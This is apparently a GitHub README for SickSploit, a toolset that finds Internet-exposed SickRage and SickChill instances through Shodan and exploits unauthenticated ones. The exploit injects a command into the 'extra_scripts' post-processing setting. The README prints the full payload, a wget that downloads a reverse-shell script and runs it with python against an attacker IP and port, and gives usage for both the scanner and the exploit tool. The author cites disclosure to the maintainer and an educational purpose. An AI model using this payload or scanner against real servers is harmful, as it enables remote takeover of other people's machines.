# SickSploit

Collection of tools/scripts to exploit Sick* instances (SickRage, SickChill and similar forks.)
You can find a more detailed introduction to this collection of tools on [my blog](https://coolbyte.eu/2019/sickown-finding-sickrage-instances/).
## Introduction 

SickRage/Chill/Beard are tools to automate the download of TV-Series using torrent or Usenet.
The programs offer similar functionalities and are all exploitable using the same technique.
In this repositories there are several tools, 'sickown' is a script which uses Shodan API to track down possible vulnerable instances of Sick* which are publicly exposed on the Internet.
Sickspolit is a POC tool that exploits a vulnerable instance.

## SickOwn 

Sickown uses a simple search query in Shodan to find open instances of Sick* and then attempts to also remove false positives from this list by querying the targets found.
At the time of the writing, 1874 targets are found. You can use the -t flag to set the request timeout
to use (default to 10s).

Example usage of SickOwn is:

    $ python sickown.py -h
    usage: sickown.py [-h] [-t TIMEOUT] API
    
    Use Shodan.io to track down vulnerable instances of SickChill/Rage
    
    positional arguments:
      API                   The API_KEY for Shodan
    
    optional arguments:
      -h, --help            show this help message and exit
      -t TIMEOUT, --timeout TIMEOUT
                            The timeout to use for the HTTP requests to the
                            targets found


## SickSploit

Sicksploit is a tool to provide a POC exploit for an open instance of Sickrage.
The exploit is easy and relies on a vulnerable feature. This vulnerabilities has been reported on 15th December to the maintainer of SickChill (the fork on which all the tests have been performed).
The exploit consisting in injecting a shell command in the 'extra_scripts' which are executed after post-processing downloaded files.
Post-processing usually consists of renaming and moving downloaded episodes of TV-Series, and Sick* offers the possibility to execute a custom script after each post-process.

The way I use to exploit this feature is by injecting a Payload such as:

    /usr/bin/wget https://raw.githubusercontent.com/Sudneo/sicksploit/master/shell.py -O /tmp/shell|/usr/bin/python /tmp/shell 192.168.1.200 4444

This will clearly download a simple reverse shell which I have also included in the repo and then execute it with IP:port to connect to as parameters.

Example usage:

    $ python sicksploit.py -h
    usage: sicksploit.py [-h] URL RHOST RPORT

    Exploit open instances of Sick*

    positional arguments:
    URL         The URL of the sick* instance to exploit - host:port
    RHOST       The IP where the exploited instance should connect to.
    RPORT       The port where the exploited instance should connect to.

    optional arguments:
    -h, --help  show this help message and exit

## Tested on

The exploit works on several versions of SickRage and SickChill where no authentication is configured. The same exploit technique would work on any SickBeard version as well.
However, I performed my tests on my own instance of SickChill Version: v2018.11.30-1 and SickRage Version: v2018.09.17-1. 


## Disclaimer

No public instances have been exploited in the process, nor I advise to do so. I have made this for pure educational purposes and I decline every responsibility for an eventual misuse of (part of) this code.
